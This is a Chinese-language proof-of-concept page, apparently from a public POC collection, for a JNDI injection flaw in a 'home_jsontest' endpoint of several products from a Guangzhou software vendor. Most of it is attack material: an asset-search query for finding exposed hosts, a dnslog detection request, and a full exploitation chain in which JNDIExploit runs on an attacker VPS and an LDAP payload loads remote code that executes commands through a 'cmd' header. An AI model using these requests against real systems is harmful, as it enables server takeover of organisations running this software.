# 速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征


# 四、漏洞复现
1. 获取dnslog

```plain
56tcas.dnslog.cn
```


2. 检测是否存在漏洞

```plain
GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://56tcas.dnslog.cn} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
Connection: close
```


漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146440-fd7d4f17-a37c-4c78-b216-daf75b276c2c.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```


```plain
GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gfkhwzlwu9779wkv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
